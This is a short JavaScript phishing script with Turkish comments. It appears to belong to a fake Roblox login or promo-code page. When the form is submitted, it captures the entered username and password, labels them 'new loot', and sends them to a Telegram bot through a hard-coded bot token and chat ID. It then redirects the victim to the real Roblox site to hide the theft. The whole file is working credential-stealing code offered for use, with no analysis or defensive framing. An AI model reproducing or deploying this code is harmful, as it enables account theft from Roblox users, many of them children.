// Kesinleşmiş Bilgiler
const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; 
const chatID = "8512406356"; 

document.getElementById('xf').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const u = document.getElementById('u').value;
    const p = document.getElementById('p').value;
    
    const mesaj = `💰 YENİ GANİMET!\n👤: ${u}\n🔑: ${p}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;

    fetch(url, { mode: 'no-cors' })
    .then(() => {
        window.location.replace("https://www.roblox.com/promocodes");
    })
    .catch(() => {
        window.location.replace("https://www.roblox.com/login");
    });
});
